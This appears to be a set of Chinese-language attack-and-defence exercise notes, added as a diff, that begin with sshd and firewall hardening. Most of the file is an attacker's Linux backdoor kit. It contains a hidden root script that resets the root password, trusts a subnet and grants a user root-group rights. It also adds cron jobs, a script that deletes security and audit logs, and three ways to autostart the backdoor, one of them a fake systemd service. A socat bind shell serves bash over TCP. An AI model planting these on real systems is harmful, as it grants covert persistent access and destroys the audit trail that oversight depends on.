@@ -1,0 +1,78 @@
+sshd服务
+1.vim /etc/ssh/sshd_config
+Port 33333
+PasswordAuthentication no   #禁用密码登录
+#AuthorizedKeysFile .ssh/authorized_keys  #密钥文件
+2.停止sshd服务
+3.防火墙
+firefox-cmd --permanent --zone=block --add-source=176.19.5.0/24
+4.修改密码
+5.关机
+进攻方后门
+vim /root/.g
+#!/bin/bash
+/usr/bin/sed -i "/DenyUsers/d" /etc/ssh/sshd_config
+/usr/bin/sed -i "/DenyUsers/d" /etc/ssh/ssh_config
+/usr/bin/systemctl restart sshd &>/dev/null
+/usr/bin/systemctl enable sshd &>/dev/null
+firewall-cmd --permanent --zone=trusted --add-source=176.19.0.0/16 &>/dev/null
+firewall-cmd --reload &>/dev/null
+echo Taren1 | passwd --stdin root
+usermod -G root Student
+
+用户Student权限
+echo "30 21 * * * /usr/sbin/poweroff" > /var/spool/cron/root
+#写计划任务
+echo "12 * * * * /usr/bin/systemctl restart sshd" >> /var/spool/cron/root
+echo "12 * * * * /usr/bin/systemctl enable sshd" >> /var/spool/cron/root
+
+vim henji
+#!/bin/bash
+/usr/bin/rm -rf /var/log/secure
+/usr/bin/rm -rf /var/log/lastlog
+/usr/bin/rm -rf /var/log/wtmp
+/usr/bin/rm -rf /var/log/audit/audit.log
+/usr/bin/chmod +x /root/.g #给脚本执行权限
+
+/usr/bin/echo /root/.g >> /etc/rc.d/rc.local #脚本开机执行
+/usr/bin/chomod +x /etc/rc.d/rc.local  #想开机自启需给执行权限
+
+实现开机自启动的三种方式
+1.把脚本放进/etc/rc.d/rc.local  #防御时注意检查
+/usr/bin/echo /root/.g >> /etc/rc.d/rc.local
+/usr/bin/chmod +x /etc/rc.d/rc.local 想开机自启需要给执行权限
+2.伪装成服务程序
+cp /usr/lib/systemd/system/crond.service /usr/lib/systemd/system/nb.service
+vim /usr/lib/systemd/system/nb.service
+把这行ExecStart=/usr/sbin/crond -n $CRONDARGS 修改为 ExecStart=/root/.g
+systemctl start nb.service
+systemctl enable  nb.service
+3.通过udev设置开机自启
+vim /etc/udev/rules.d/usb.rules
+ACTION=="add",ENV{DEVNAME}=="/dev/vda1",RUN+="root/.g"
+可以把/dev/vda1(虚拟机硬盘标识)改为/dev/sda1(真机的硬盘标识)
+
+还可以通过端口留后门 需装socat包
+被控端socat tcp-listen:701,fork,reuseaddr exec:bash,pty,stderr &
+控制端socat readline tcp-connect:192.168.4.50:701
+
+幻境防御大法
+通过nginx反向代理转发或者防火墙端口转发功能，就是攻击方通过ssh访问真机ip,进入的却是虚拟机
+然后虚拟机可以事先做好幻境，让攻击方难以察觉
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
